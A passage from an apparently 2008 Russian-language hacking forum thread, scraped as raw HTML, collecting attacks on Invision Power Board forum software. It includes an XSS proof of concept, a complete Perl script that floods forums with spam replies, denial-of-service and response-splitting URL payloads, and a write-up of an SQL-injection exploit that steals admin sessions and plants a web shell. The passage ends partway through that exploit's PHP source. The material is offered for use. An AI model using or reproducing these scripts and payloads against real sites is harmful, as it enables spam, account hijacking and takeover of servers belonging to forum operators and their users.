/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //print dechex&#40;ord&#40;$code&#123;$i&#125;&#41;&#41;.'&lt;Br&gt;'; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $new .= '%' . dechex&#40;ord&#40;$code&#123;$i&#125;&#41;&#41;; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#125; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $url&#91;'html'&#93; = str_replace&#40; $code, $new, $url&#91;'html'&#93; &#41;; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#125; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#125; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Using the :/ smiley <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $url&#91;'html'&#93; = str_replace&#40; 'http%3a%2f', 'http:/', $url&#91;'html'&#93; &#41;; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#125; <br />&nbsp; &nbsp; &nbsp; &nbsp; &#125; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $url&#91;'html'&#93; = htmlspecialchars&#40; $url&#91;'html'&#93; &#41;; <br />...................... </code></dd></dl></div><div id="sig53767" class="signature">Спорьте, заблуждайтесь, ошибайтесь, но, ради бога, размышляйте, и хотя криво, да сами.
<br /><img src="http://megaobzor.com/load/forum/adminlich.gif" alt="Изображение" />
<br />Серьезное лицо - еще не признак ума, господа. Вы улыбайтесь, господа, улыбайтесь!</div>
</div>
<dl class="postprofile" id="profile53767"><dt><span style="font-size: 1.1em;"><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #ff8000;" class="username-coloured">Lenar</a></span> <img src="./styles/prosilver/theme/images/icon_gender_m.gif" title="Пол: Мужской" alt="M" /></dt><dd>Местный Босс</dd><dd><img src="./images/ranks/r10.gif" alt="Местный Босс" title="Местный Босс" /></dd><dd><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a"><img src="./download/file.php?avatar=2_1318920352.gif" width="100" height="100" alt="Аватара пользователя" /></a></dd><dd><strong>Откуда:</strong> Казань</dd><dd><strong>Сообщения:</strong> 11725</dd><dd><strong>Медали:</strong> 12</dd><dd><img src="./images/medals/Medal-5.gif" border="0" alt="Ораторская (11)" title="Ораторская (11)"   /><img src="./images/medals/Medal-4.gif" border="0" alt="Творец MegaObzor (1)" title="Творец MegaObzor (1)"   /></dd><dd><ul class="profile-icons"><li class="skype-icon"><a href="skype:lenarsmm?chat" title="Skype"><span>Skype</span></a></li></ul></dd>
</dl>
<div class="back2top"><a href="#wrap" class="top" title="Вернуться к началу">Вернуться к началу</a></div>
<span class="corners-bottom"><span></span></span></div></div>
<hr class="divider" /><div id="p57534" class="post bg2"><div class="inner"><span class="corners-top"><span></span></span>
<div class="postbody"><p class="author"><a href="./viewtopic.php?p=57534&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a#p57534"><img src="./styles/prosilver/imageset/icon_post_target.gif" width="11" height="9" alt="Сообщение" title="Сообщение" /></a> <strong><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #ff8000;" class="username-coloured">Lenar</a></strong> &raquo; 13 июн 2008 21:18 </p>

<div class="content"><span style="font-weight: bold">Invision Power Board &lt;=2.3.5 Active XSS</span>
<br />Работает в ie
<br />Не работает в opera
<br />1) создаем файл any.html внути него &lt;script&gt;alert()&lt;/script&gt;
<br />2) содаем пост с аттачем any.html</div><div id="sig57534" class="signature">Спорьте, заблуждайтесь, ошибайтесь, но, ради бога, размышляйте, и хотя криво, да сами.
<br /><img src="http://megaobzor.com/load/forum/adminlich.gif" alt="Изображение" />
<br />Серьезное лицо - еще не признак ума, господа. Вы улыбайтесь, господа, улыбайтесь!</div>
</div>
<dl class="postprofile" id="profile57534"><dt><span style="font-size: 1.1em;"><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #ff8000;" class="username-coloured">Lenar</a></span> <img src="./styles/prosilver/theme/images/icon_gender_m.gif" title="Пол: Мужской" alt="M" /></dt><dd>Местный Босс</dd><dd><img src="./images/ranks/r10.gif" alt="Местный Босс" title="Местный Босс" /></dd><dd><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a"><img src="./download/file.php?avatar=2_1318920352.gif" width="100" height="100" alt="Аватара пользователя" /></a></dd><dd><strong>Откуда:</strong> Казань</dd><dd><strong>Сообщения:</strong> 11725</dd><dd><strong>Медали:</strong> 12</dd><dd><img src="./images/medals/Medal-5.gif" border="0" alt="Ораторская (11)" title="Ораторская (11)"   /><img src="./images/medals/Medal-4.gif" border="0" alt="Творец MegaObzor (1)" title="Творец MegaObzor (1)"   /></dd><dd><ul class="profile-icons"><li class="skype-icon"><a href="skype:lenarsmm?chat" title="Skype"><span>Skype</span></a></li></ul></dd>
</dl>
<div class="back2top"><a href="#wrap" class="top" title="Вернуться к началу">Вернуться к началу</a></div>
<span class="corners-bottom"><span></span></span></div></div>
<hr class="divider" /><div id="p60954" class="post bg1"><div class="inner"><span class="corners-top"><span></span></span>
<div class="postbody"><p class="author"><a href="./viewtopic.php?p=60954&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a#p60954"><img src="./styles/prosilver/imageset/icon_post_target.gif" width="11" height="9" alt="Сообщение" title="Сообщение" /></a> <strong><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #ff8000;" class="username-coloured">Lenar</a></strong> &raquo; 08 авг 2008 16:38 </p>

<div class="content"><span style="font-weight: bold">IPB Forum Flood</span>
<br />
<br />[php]#---------------------------- 
<br />#   this programe has been  # 
<br />#   created by NikTrix-Souvico       # 
<br />#   [ 'HellSoft' ] for      # 
<br />#   Flooding IPB Forums     # 
<br />#---------------------------- 
<br /> 
<br />#!/usr/bin/perl -w 
<br />use strict; 
<br />use LWP::UserAgent; 
<br />use HTTP::Cookies; 
<br /> 
<br />#Variables 
<br />my  $url        =   undef; 
<br />my  $login      =   undef; 
<br />my  $UserName   =   undef; 
<br />my  $PassWord   =   undef; 
<br />my  $CookieDate =   1; 
<br />my  $SID        =   undef; 
<br />my  $SE         =   undef; 
<br />my  $MSG        =   undef; 
<br /> 
<br />#Prototype 
<br />sub IPBFlood($); 
<br /> 
<br />#Main 
<br />print &quot;\t\tWelcome to IPBFlood 0.1x By Souvik\t\t[ 'NikTrix' ]Team&quot;; 
<br /> 
<br />print &quot;Url\t: &quot;;chomp($url=); 
<br />print &quot;UserName\t: &quot;;chomp($UserName=); 
<br />print &quot;Password\t: &quot;;chomp($PassWord=); 
<br />print &quot;Start [to] End\t: &quot;;chomp($SE=); 
<br />print &quot;Message\t: &quot;;chomp($MSG=); 
<br /> 
<br />my  $ua     =   LWP::UserAgent-&gt;new; 
<br />$ua-&gt;agent(&quot;Mozilla/4.0&quot;); 
<br />my  $cj     =   HTTP::Cookies-&gt;new(file =&gt; &quot;N/A&quot; , autosave =&gt; 0); 
<br />$ua-&gt;cookie_jar($cj); 
<br /> 
<br />#-get SID 
<br />my  $r      =   $ua-&gt;get($url); 
<br />if($r-&gt;is_success){ 
<br />    #Find SID ? 
<br />    ($SID) = $r-&gt;content =~/\?s=(\w{32})&amp;.*/i; 
<br />    print &quot;SID : $SID&quot;; 
<br />} 
<br /> 
<br />#-Connecting ... 
<br />$r          =   $ua-&gt;post($url.$login,[UserName=&gt; $UserName ,PassWord =&gt; $PassWord ,CookieDate =&gt;$CookieDate , s =&gt; $SID]); 
<br />if($r-&gt;is_success){ 
<br />    print &quot;[+] Connected&quot; if($r-&gt;content =~ /cliquez ici si vous ne souhaitez pas/gi); 
<br />    my($Start , $End) = split(/-/,$SE); 
<br />    foreach($Start..$End){ 
<br />        IPBFlood($_); 
<br />    } 
<br />} 
<br /> 
<br />#Subroutines 
<br />sub IPBFlood($){ 
<br />    my $Topic   =   shift; 
<br />    my $get     =   $ua-&gt;get($url.&quot;s=$SID&amp;showtopic=$Topic&quot;); 
<br />    if($get-&gt;is_success){ 
<br />        #Get Subforum ID &quot;f&quot; : variable ! 
<br />        if( my ($f) = $get-&gt;content =~/f=(\d{1,4})/ ){ 
<br />            print &quot;[-]Subforum ID : $f &amp; Topic N : $Topic&quot;; 
<br />            #Get Post AuthKey for Subforum f=N° 
<br />            $get    =   $ua-&gt;get($url.&quot;s=$SID&amp;act=post&amp;do=reply_post&amp;f=$f&amp;t=$Topic&quot;); 
<br />            #                          act=post&amp;do=reply_post&amp;f=56&amp;t=43988 
<br />            if($get-&gt;is_success){ 
<br />                ##auth_key Ex :  
<br />                my ( $auth_key ) = $get-&gt;content =~/auth_key.*(\w{32})/i; 
<br />                #attach_post_key Ex :  
<br />                my ( $attach_post_key ) = $get-&gt;content =~/attach_post_key.*(\w{32})/i; 
<br />                print &quot;[-]auth_key : $auth_key[-]attach_post_key : $attach_post_key&quot;; 
<br /> 
<br /> 
<br />                my %form =(st                 =&gt;  0, 
<br />                           act                =&gt;  &quot;Post&quot;, 
<br />                           s                  =&gt;  &quot;$SID&quot;, 
<br />                           f                  =&gt;  &quot;$f&quot;, 
<br />                           auth_key           =&gt;  &quot;$auth_key&quot;, 
<br />                           removeattachid     =&gt;  &quot;0&quot;, 
<br />                           CODE               =&gt;  &quot;03&quot;, 
<br />                           t                  =&gt;  &quot;$Topic&quot;, 
<br />                           attach_post_key    =&gt;  &quot;$attach_post_key&quot;, 
<br />                           parent_id          =&gt;  &quot;0&quot;, 
<br />                           &quot;ed-0_wysiwyg_used&quot;=&gt;  &quot;0&quot;, 
<br />                           &quot;editor_ids%5B%5D&quot; =&gt;  &quot;ed-0&quot;, 
<br />                           Post               =&gt;  &quot;$MSG&quot;, 
<br />                           enableemo          =&gt;  &quot;yes&quot;, 
<br />                           enablesig          =&gt;  &quot;yes&quot;, 
<br />                           iconid             =&gt;  &quot;0&quot; 
<br />                           ); 
<br />                $r      =   $ua-&gt;post($url.&quot;s=$SID&quot;,\%form); 
<br />                if($r-&gt;is_success){ 
<br />                    print &quot;Send success !&quot; if( length($r-&gt;content)&lt; 300); 
<br />                } 
<br />            } 
<br />        } 
<br />    } 
<br />}[/php]</div><div id="sig60954" class="signature">Спорьте, заблуждайтесь, ошибайтесь, но, ради бога, размышляйте, и хотя криво, да сами.
<br /><img src="http://megaobzor.com/load/forum/adminlich.gif" alt="Изображение" />
<br />Серьезное лицо - еще не признак ума, господа. Вы улыбайтесь, господа, улыбайтесь!</div>
</div>
<dl class="postprofile" id="profile60954"><dt><span style="font-size: 1.1em;"><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #ff8000;" class="username-coloured">Lenar</a></span> <img src="./styles/prosilver/theme/images/icon_gender_m.gif" title="Пол: Мужской" alt="M" /></dt><dd>Местный Босс</dd><dd><img src="./images/ranks/r10.gif" alt="Местный Босс" title="Местный Босс" /></dd><dd><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a"><img src="./download/file.php?avatar=2_1318920352.gif" width="100" height="100" alt="Аватара пользователя" /></a></dd><dd><strong>Откуда:</strong> Казань</dd><dd><strong>Сообщения:</strong> 11725</dd><dd><strong>Медали:</strong> 12</dd><dd><img src="./images/medals/Medal-5.gif" border="0" alt="Ораторская (11)" title="Ораторская (11)"   /><img src="./images/medals/Medal-4.gif" border="0" alt="Творец MegaObzor (1)" title="Творец MegaObzor (1)"   /></dd><dd><ul class="profile-icons"><li class="skype-icon"><a href="skype:lenarsmm?chat" title="Skype"><span>Skype</span></a></li></ul></dd>
</dl>
<div class="back2top"><a href="#wrap" class="top" title="Вернуться к началу">Вернуться к началу</a></div>
<span class="corners-bottom"><span></span></span></div></div>
<hr class="divider" /><div id="p63285" class="post bg2"><div class="inner"><span class="corners-top"><span></span></span>
<div class="postbody"><p class="author"><a href="./viewtopic.php?p=63285&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a#p63285"><img src="./styles/prosilver/imageset/icon_post_target.gif" width="11" height="9" alt="Сообщение" title="Сообщение" /></a> <strong><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #ff8000;" class="username-coloured">Lenar</a></strong> &raquo; 02 сен 2008 20:11 </p>

<div class="content"><span style="font-weight: bold">1) Отказ в обслуживании</span>
<br />
<br />Неправильное использование пост-инкремента в защитной функции разбора массивов.
<br />Сервер будет рекурсивно обрабатывать не первые 10 подмассивов, а все.
<br />
<br /><blockquote class="uncited"><div>/index.php?foo[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]=123</div></blockquote><br /><br />соответственно чем больше скобок, тем дольше будет обработка<br /><br /><span style="font-weight: bold">2) HTTP Response Splitting attacks</span><br /><br />INFO[base_url] не определен в конфиге<br /><br /><blockquote class="uncited"><div>/admin.php?INFO[base_url]=http://phishing-hax.com/</div></blockquote><br /><span style="font-weight: bold">Invision Power Board &lt;= 2.3.5 Multiple Vulnerabilities</span><br /><br />Экспоит основывается на SQL-inj в параметре &quot;name&quot; файла &quot;sources/action_public/xmlout.php&quot;<br />и использует технологию классического посимвольного брута данных.<br />Особенность урленкода %2527 делает его независимым от magic_quotes.<br /><br />/ipb235/index.php?s=&amp;act=xmlout&amp;do=check-display-name&amp;name=%2527<br /><br />В эксплоите предусмотрено три режима работы.<br /><br />-attack 1<br /><br />Через скуль получают сессию админа.<br />Из настроек извлекается инфа о привязке сессии к ip-address и browser.<br />Если таковая привязка имеется (включено по дефолту) и админ заходил не из под прокси - атака невозможна.<br />В ином случае - извлекаются ip-address и browser админа и производится попытка войти под админом.<br />В случае успешной попытки эксплоит прописывает веб-шелл в файл языка.<br /><br />Вероятность успеха атаки мала, ибо:<br />~ сессия имет по дефолту привязку к айпи и браузеру<br />~ время жизни сессии скорее всего просрочено. придется караулить админа, либо спровоцировать его зайти в админку.<br /><br />Сам процесс &quot;ожидания&quot; в эксплоите реализован в цикле - ожидание появления новой сессии.<br /><br />Пример запуска эксплойта:<br /><blockquote class="uncited"><div>php ipb235-multi.txt -attack 1 -url <!-- m --><a class="postlink" href="http://www.ipb-235.com/forum/">http://www.ipb-235.com/forum/</a><!-- m --></div></blockquote>
<br />
<br />-attack 2
<br />
<br />Как ни удивительно - в сессии cookie *ipb_stronghold пользователя присутствует пароль к БД.
<br />Используя атаку по словарю, эксплоит пытается сбрутить пароль к БД из хеша сессии.
<br />Через скуль эксплоит получает имя текущего пользователя БД.
<br />
<br />Необходима валидная учетная запись, либо куки со сниффера.
<br />Вероятность успеха мала и зависит в большей мере от вашего словаря и рэндомности пароля.</div><div id="sig63285" class="signature">Спорьте, заблуждайтесь, ошибайтесь, но, ради бога, размышляйте, и хотя криво, да сами.
<br /><img src="http://megaobzor.com/load/forum/adminlich.gif" alt="Изображение" />
<br />Серьезное лицо - еще не признак ума, господа. Вы улыбайтесь, господа, улыбайтесь!</div>
</div>
<dl class="postprofile" id="profile63285"><dt><span style="font-size: 1.1em;"><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #ff8000;" class="username-coloured">Lenar</a></span> <img src="./styles/prosilver/theme/images/icon_gender_m.gif" title="Пол: Мужской" alt="M" /></dt><dd>Местный Босс</dd><dd><img src="./images/ranks/r10.gif" alt="Местный Босс" title="Местный Босс" /></dd><dd><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a"><img src="./download/file.php?avatar=2_1318920352.gif" width="100" height="100" alt="Аватара пользователя" /></a></dd><dd><strong>Откуда:</strong> Казань</dd><dd><strong>Сообщения:</strong> 11725</dd><dd><strong>Медали:</strong> 12</dd><dd><img src="./images/medals/Medal-5.gif" border="0" alt="Ораторская (11)" title="Ораторская (11)"   /><img src="./images/medals/Medal-4.gif" border="0" alt="Творец MegaObzor (1)" title="Творец MegaObzor (1)"   /></dd><dd><ul class="profile-icons"><li class="skype-icon"><a href="skype:lenarsmm?chat" title="Skype"><span>Skype</span></a></li></ul></dd>
</dl>
<div class="back2top"><a href="#wrap" class="top" title="Вернуться к началу">Вернуться к началу</a></div>
<span class="corners-bottom"><span></span></span></div></div>
<hr class="divider" /><div id="p63322" class="post bg1"><div class="inner"><span class="corners-top"><span></span></span>
<div class="postbody"><p class="author"><a href="./viewtopic.php?p=63322&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a#p63322"><img src="./styles/prosilver/imageset/icon_post_target.gif" width="11" height="9" alt="Сообщение" title="Сообщение" /></a> <strong><a href="./memberlist.php?mode=viewprofile&amp;u=895&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #0000a0;" class="username-coloured">divir</a></strong> &raquo; 03 сен 2008 15:05 </p>

<div class="content"><span style="font-weight: bold">Сам эксплойт ipb235 multi в дополнение:</span>
<br />
<br /><dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>#!/usr/bin/php -q<br />&lt;?php<br />error_reporting&#40;E_ALL ^ E_NOTICE&#41;;<br /><br /># yeah ... it rox &#40;:<br />class ipb_spl<br />&#123;<br />&nbsp; &nbsp;var $web;<br /><br />&nbsp; &nbsp;function main&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;mhead&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Gimme your args<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_attack = $this-&gt;get_p&#40;'attack', true&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_prox&nbsp; &nbsp;= $this-&gt;get_p&#40;'proxhost'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_proxa&nbsp; = $this-&gt;get_p&#40;'proxauth'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;init_global&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Proxy params<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;p_prox &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;proxy&#40;$this-&gt;p_prox&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;p_proxa &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;proxyauth&#40;$this-&gt;p_proxa&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;# Where do we go ?<br />&nbsp; &nbsp;&nbsp; &nbsp;switch&#40; $this-&gt;p_attack &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;case 1:&nbsp; &nbsp; $this-&gt;code_exec&#40;&#41;;&nbsp; break;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;case 2:&nbsp; $this-&gt;bf_sql_pwd&#40;&#41;; break;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;case 3:&nbsp; $this-&gt;bf_usr_pwd&#40;&#41;; break;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;default: $this-&gt;usage&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function code_exec&#40;$loop=1&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;# First loop<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $loop == 1 &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;set_sql_param&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;set_sql_focus&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_acp = $this-&gt;get_p&#40;'acp'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# ACP path<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;p_acp &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# If the user changed the ACP directory, we can<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# find it &#40;if the &quot;Remove ACP Link&quot; option was not<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# applied&#41; by log in as an Admin, and then click<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# on &quot;Admin CP&quot;. This can be done with a user<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# but I didn't implemented that&nbsp; ;&#41; <br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Using default ACP path: admin', 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_acp = 'admin';<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Using ACP path &quot;'.$this-&gt;p_acp.'&quot;', 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Init client headers:<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Only if we have the same IP as the targeted user &#40;not admin&#41;,<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# it resets session datas, so we try to spoof our <br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# IP as a random one in order to keep user's session datas while<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# we bruteforce SQL fields.<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;bypass_matches&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Remove expired sessions &#40; time&#40;&#41; - 60*60*2&nbsp; =&nbsp; &gt; 2 hours &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;get&#40;$this-&gt;p_url.$this-&gt;p_acp.'/index.php?'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Removed all out of date admin sessions', 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Cookie prefix<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;get_cprefix&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Admin session ?<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Trying to find an admin session id', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Got one :&#93;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;get_admin_sess&#40;&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_admin = true;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_sess&nbsp; = $this-&gt;data&#91;'a_sess_id'&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;a_url&nbsp; &nbsp;= $this-&gt;p_url.$this-&gt;p_acp.'/index.php?adsess='.$this-&gt;s_sess;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Nothing special<br />&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_admin = false;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'No admin session id found', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# User session ?<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;s_sess &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Trying to find a user session id', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Yep<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;get_user_sess&#40;&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_sess = $this-&gt;data&#91;'u_sess_id'&#93;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# F0ck<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'No user session id found', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Admin session &gt; 2 hours or user logged out', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Keeping trying until the user connects', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Entering loop #'.$loop.' ...', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;code_exec&#40;++$loop&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Getting security options', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Security options<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;get_sec_options&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# IP filter ?<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; 